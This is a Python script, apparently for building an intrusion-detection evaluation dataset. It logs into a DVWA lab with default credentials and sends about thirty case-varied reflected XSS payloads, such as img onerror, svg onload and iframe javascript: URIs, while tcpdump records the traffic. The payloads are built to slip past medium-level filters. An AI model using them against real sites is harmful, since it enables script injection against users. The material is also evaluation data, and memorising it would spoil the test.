import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS XSS EVALUACION MEDIUM
# DISTINTOS a entrenamiento_xss.py (low) Y
# DISTINTOS a entrenamiento_xss_medium.py (medium)
# =============================================

PAYLOADS_XSS_EVAL_MEDIUM = [
    # Variantes de mayusculas distintas
    "<iMg src=x onerror=alert(1)>",
    "<iMg src=x onerror=alert(2)>",
    "<iMg src=x onerror=alert(3)>",
    "<ImG SrC=x OnErRoR=alert(1)>",
    "<iMaGe src=x onerror=alert(1)>",
    # SVG variantes distintas
    "<SvG onload=alert(1)>",
    "<SvG/onload=alert(1)>",
    "<SVg onload=alert(2)>",
    "<sVg onload=alert(3)>",
    # Body variantes
    "<BoDy onload=alert(1)>",
    "<BODY/onload=alert(1)>",
    "<bOdY onpageshow=alert(1)>",
    "<body onhashchange=alert(1)>",
    # Input variantes distintas
    "<InPuT onfocus=alert(1) autofocus>",
    "<INPUT onblur=alert(1) autofocus>",
    "<input onkeydown=alert(1) autofocus>",
    "<input onkeyup=alert(1) autofocus>",
    # Video/audio variantes
    "<ViDeO src=x onerror=alert(1)>",
    "<AuDiO src=x onerror=alert(1)>",
    "<video oncanplay=alert(1) src=x>",
    # Iframe variantes
    "<IFrAmE onload=alert(1)>",
    "<iframe onload=alert(2)>",
    "<iframe src=javascript:alert(2)>",
    # Eventos menos usados en entrenamiento
    "<div onmouseenter=alert(1)>hover</div>",
    "<div onmouseleave=alert(1)>hover</div>",
    "<div onclick=alert(1)>click</div>",
    "<p onmouseover=alert(1)>hover</p>",
    "<span onmouseover=alert(1)>hover</span>",
    # Object variantes
    "<ObJeCt data=javascript:alert(1)>",
    "<EMBED SRC=javascript:alert(1)>",
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_xss_eval_medium(session):
    print("\n[*] Iniciando ataques XSS MEDIUM (evaluacion)...")
    payloads = PAYLOADS_XSS_EVAL_MEDIUM.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/xss_r/",
                            params={"name": payload})
            print(f"  XSS_EVAL_M | {payload[:45]:<45} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] XSS Medium evaluacion completado: {ok}/{len(payloads)} peticiones")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  EVALUACION: XSS REFLECTED — NIVEL MEDIUM")
    print("  Etiqueta real: 'xss'")
    print("  !! NO subir el pcap a Elasticsearch !!")
    print("  Guardarlo como: evaluacion_xss_medium.pcap")
    print("  AVISO: Asegurate de que DVWA esta en nivel MEDIUM")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_xss_eval_medium(session)

    print("\n" + "="*60)
    print("  COMPLETADO. Guarda el pcap como: evaluacion_xss_medium.pcap")
    print("="*60)
